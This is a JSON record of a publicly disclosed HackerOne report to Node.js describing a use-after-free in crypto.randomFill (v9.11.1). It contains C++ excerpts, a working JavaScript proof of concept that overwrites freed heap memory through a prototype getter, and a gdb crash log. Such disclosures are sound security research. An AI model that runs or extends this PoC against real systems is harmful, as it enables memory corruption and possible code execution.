@@ -1,0 +1,109 @@
+{
+  "id": 340053,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDAwNTM=",
+  "url": "https://hackerone.com/reports/340053",
+  "title": "Use After Free in crypto.randomFill",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2018-04-18T12:38:05.607Z",
+  "submitted_at": "2018-04-18T12:38:05.607Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tunz",
+    "url": "/tunz",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-01-15T02:00:32.927Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-15T02:00:32.891Z",
+  "team_member_agreed_on_going_public_at": "2020-01-14T23:48:27.884Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nWe can trigger Use-After-Free while running crypto.randomFill, so we can easily read/write heap memory using a typed array pointing a freed backing store.\n\n**Description:**\n\nSee this `node_crypto.cc` code.\n```pp\nvoid RandomBytesBuffer(const FunctionCallbackInfo<Value>& args) {\n...\n  char* data = Buffer::Data(args[0]); // <------------ Get a backing store from a given argument.\n  data += offset;\n\n  std::unique_ptr<RandomBytesRequest> req(\n      new RandomBytesRequest(env,\n                             obj,\n                             size,\n                             data,     // <--------------------- Store the data to req\n                             RandomBytesRequest::DONT_FREE_DATA));\n...\n  } else {\n    Local<Value> argv[2];\n    RandomBytesProcessSync(env, std::move(req), &argv); // <---- This calls RandomBytesCheck\n...\n```\n\n```pp\nvoid RandomBytesCheck(RandomBytesRequest* req, Local<Value> (*argv)[2]) {\n...\n    char* data = nullptr;\n    size_t size;\n    req->return_memory(&data, &size);\n    (*argv)[0] = Null(req->env()->isolate());\n    Local<Value> buffer =\n        req->object()->Get(req->env()->context(),\n                           req->env()->buffer_string()).ToLocalChecked(); // <----- We can return a non-buffer object here by modifying Object.prototype getter.\n\n    if (buffer->IsArrayBufferView()) {\n      ...\n    } else {\n      (*argv)[1] = Buffer::New(req->env(), data, size) // <------- This creates a Buffer with the backing store of a given argument Buffer.\n          .ToLocalChecked();\n...\n```\n\nAs a result, two buffers are sharing a backing store, so this triggers use-after-free if one of the buffers are freed by gc.\n\n## Steps To Reproduce:\n\nExecute the following code.\n\n```js\nconst crypto = require('crypto');\n\nObject.defineProperty(Object.prototype, \"buffer\", {\n  get: function() {\n    return {}; // Return a non-buffer.\n  }, set: function(v) {\n  }\n});\n\nlet size = 100000;\nlet ta = new Uint8Array(size);\ncrypto.randomFillSync(ta, 0, size);\n\n// Actually we don't need this part, this makes a buffer free and crashes just for PoC\nlet arr_size = 10000;\nlet arrs = new Array(arr_size);\nfor (let i = 0; i <arr_size; i++) {\n  let tmp = new Array(0x500);\n  arrs[i] = tmp;\n}\n\n// Just overwrites heap memory space to 0x41\nfor (let i = 0; i < size; i++) {\n  ta[i] = 0x41;\n}\n```\n\n```\n$ ./out/Release/node --version\nv9.11.1\n$ gdb -q --args ./out/Release/node randombytes.js\nReading symbols from ./out/Release/node...r\ndone.\n(gdb) r\nStarting program: /.../ randombytes.js\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7fcd52464700 (LWP 34515)]\n[New Thread 0x7fcd51c63700 (LWP 34516)]\n[New Thread 0x7fcd51462700 (LWP 34520)]\n[New Thread 0x7fcd50c61700 (LWP 34522)]\n[New Thread 0x7fcd5391d700 (LWP 34529)]\n\nThread 1 \"node\" received signal SIGSEGV, Segmentation fault.\n_int_malloc (av=av@entry=0x7fcd52829b20 <main_arena>, bytes=bytes@entry=8192) at malloc.c:3567\n3567    malloc.c: No such file or directory.\n(gdb) x/i $pc\n=> 0x7fcd524e6f04 <_int_malloc+900>:    mov    rdx,QWORD PTR [rax+0x8]\n(gdb) i r rax\nrax            0x4141414141414141       4702111234474983745\n(gdb)\n```\n\nI've tested this in node v9.11.1 built with clang in Ubuntu 16.04.3, and also reproducible in the master branch at the time of writing this report.\n\n## Impact\n\nThis vulnerability could lead to Remote Code Execution.",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 2,
+  "voters": [
+    "johndoe1492",
+    "jiri1234"
+  ],
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
